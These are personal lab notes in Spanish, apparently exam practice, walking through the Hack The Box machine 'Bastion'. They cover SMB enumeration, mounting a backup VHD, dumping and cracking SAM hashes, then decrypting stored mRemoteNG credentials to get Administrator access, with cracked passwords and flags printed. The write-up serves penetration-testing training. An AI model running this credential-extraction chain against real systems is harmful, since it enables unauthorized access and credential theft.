-- --
- Tags: #bufferoverflow #ejptmachine 
---
https://0xdf.gitlab.io/2019/09/07/htb-bastion.html
https://khaoticdev.net/hack-the-box-bastion/

`nmap -p- --min-rate 5000 -sCV -n 10.10.10.134 -oN portScan`

![Pasted image 20250108173109](../../Fotos/Pasted%20image%2020250108173109.png)

![Pasted image 20250108173133](../../Fotos/Pasted%20image%2020250108173133.png)

Vemos que actualmente corre el servicio SMB
`smbclient -L ////10.10.10.134//`

![Pasted image 20250108174419](../../Fotos/Pasted%20image%2020250108174419.png)

`smbmap -H 10.10.10.134 -u "asda"`
- u de usuario cualquiera a ver si lo toma

![Pasted image 20250108234139](../../Fotos/Pasted%20image%2020250108234139.png)

-  Permiso de lectura ye escritura en backups

`smbmap -H 10.10.10.134 -u "asda" -r Backups`
-  Nos va a listar lo que haya en dicho directorio

![Pasted image 20250108234354](../../Fotos/Pasted%20image%2020250108234354.png)

- Como hay mas archivos y subdirectorios usaremos monturas

`mount -t cifs //10.10.10.134/Backups (direccion a eleccion para traer) -o username=(usuario a eleccion)`
`mount //10.10.10.134/Backups SMBShare/`

![Pasted image 20250108175127](../../Fotos/Pasted%20image%2020250108175127.png)

![Pasted image 20250108175144](../../Fotos/Pasted%20image%2020250108175144.png)

`tree`

![Pasted image 20250108180029](../../Fotos/Pasted%20image%2020250108180029.png)

`qemu-nbd -r -c /dev/nbd0  /home/kali/Desktop/bastion/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd`
- En caso que nos salga un error como : qemu-nbd: Failed to open /dev/nbd0: No such file or directory Hay que poner el siguiente comando
- `sudo modprobe nbd`
- Esto carga el modulo kernel de nbd
`sudo qemu-nbd -d /dev/nbd0  # Desconecta cualquier uso previo.`
- Verificar que /dev/nbd0 no este en uso

![Pasted image 20250109000311](../../Fotos/Pasted%20image%2020250109000311.png)

![Pasted image 20250109000319](../../Fotos/Pasted%20image%2020250109000319.png)

- Esto nos crea el nbd0p1 y con esto crearemos una montura

`mount /dev/nbd0p1 HDD/`

![Pasted image 20250109104627](../../Fotos/Pasted%20image%2020250109104627.png)

- Esto lanza errores pero aun asi se realiza la montura

![Pasted image 20250109104634](../../Fotos/Pasted%20image%2020250109104634.png)

---
Esto seria como la raíz del sistema windows que montamos en el directorio HDD que es el contenido del VHD

![Pasted image 20250109000713](../../Fotos/Pasted%20image%2020250109000713.png)

Como no estamos en un active directory, una ruta interesante seria
`/Windows/System32/config`

![Pasted image 20250109002106](../../Fotos/Pasted%20image%2020250109002106.png)

Nos interesan estos archivos 

![Pasted image 20250109002119](../../Fotos/Pasted%20image%2020250109002119.png)

![Pasted image 20250109002125](../../Fotos/Pasted%20image%2020250109002125.png)

----

`find HDD/Windows/ -name *SYSTEM* & find HDD/Windows/ -name *SAM*`

![Pasted image 20250109110003](../../Fotos/Pasted%20image%2020250109110003.png)

- Aqui encontramos la ruta del SAM y el SYSTEM

`samdump2 SYSTEM SAM`
- Para extraer los hashes de contraseñas de un sistema Windows a partir de los archivos del Registro de Windows (`SYSTEM` y `SAM`)

![Pasted image 20250109110646](../../Fotos/Pasted%20image%2020250109110646.png)

- Solo esta habilitado un usuario que es el L4mpje

`echo "L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::" > hash.txt`
`john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
- El formato NTLM hay que forzarlo, para saber esto hay que averiguar si el hash es NTML

![Pasted image 20250109111716](../../Fotos/Pasted%20image%2020250109111716.png)

L4mpje:bureaulampje

Nos conectamos por SSH

![Pasted image 20250109113643](../../Fotos/Pasted%20image%2020250109113643.png)

`Maquina Vulnerada`

User Flag: 4df24c817c6d159b681c55ad28d38fc0

----

*Escalada de Privilegios* 

- (Existen mas métodos a pesar que hay que descargar un script de github fue la manera mas sencilla en comparación a otras y en vista que es para preparar eJPTv2 solamente lo que vimos hoy ya que podemos hacer las cosas mas optimamente con scripts)

Encontramos un software llamado **mRemoteNG** (Hay una vulnerabilidad conocida con este software)
- mRemoteNG es una herramienta de administración de conexiones remotas que permite al usuario guardar contraseñas para distintos tipos de conexiones. Hay un archivo en el directorio AppData del usuario, confCons.xml, que contiene esa información

![Pasted image 20250109114027](../../Fotos/Pasted%20image%2020250109114027.png)

ruta: `C:\Users\L4mpje\AppData\Roaming\mRemoteNG`

![Pasted image 20250109114256](../../Fotos/Pasted%20image%2020250109114256.png)

Es xml con versiones cifradas  1.0

![Pasted image 20250109114521](../../Fotos/Pasted%20image%2020250109114521.png)

---
Info:
- Hay muchos artículos como este y este que apuntan a una versión anterior del software que usaba una clave estática para descifrar las contraseñas. El módulo Metasploit también abusa de esto. A partir de la versión 1.76, el usuario puede elegir una contraseña maestra, pero sigue habiendo una contraseña predeterminada o “mR3m”. Sin embargo, el modo de bloqueo AES predeterminado también cambió, lo que deja a todas las herramientas anteriores incapaces de descifrar archivos más nuevos.
- mRemoteNG utiliza un cifrado débil (AES con una clave conocida), y las credenciales se pueden descifrar con herramientas específicas.
- No hay herramienta nativa en kali linux para poder decifrar archivos cifrados por el softwaare mRemoteNG
---

`wget https://raw.githubusercontent.com/haseebT/mRemoteNG-Decrypt/master/mremoteng_decrypt.py`

![Pasted image 20250109115520](../../Fotos/Pasted%20image%2020250109115520.png)

Transferiremos el archivo que contiene las contrasenas cifradas confCons.xml
`scp L4mpje@10.10.10.134:"C:/Users/l4mpje/AppData/Roaming/mRemoteNG/confCons.xml" /home/kali/Desktop/bastion`

![Pasted image 20250109115854](../../Fotos/Pasted%20image%2020250109115854.png)

`python3 mremoteng_decrypt.py -s /home/kali/Desktop/bastion/confCons.xml`
`python3 mremoteng_decrypt.py -f /home/kali/Desktop/bastion/confCons.xml`
`./mremoteng_decrypt.py -s /home/kali/Desktop/bastion/confCons.xml`

![Pasted image 20250109120704](../../Fotos/Pasted%20image%2020250109120704.png)

Administrator:thXLHM96BeKL0ER2

![Pasted image 20250109120809](../../Fotos/Pasted%20image%2020250109120809.png)

`Maquina Vulnerada`

Root Flag: f233c8fc099bd782cb779fe530b31966 

---

*Preguntas*





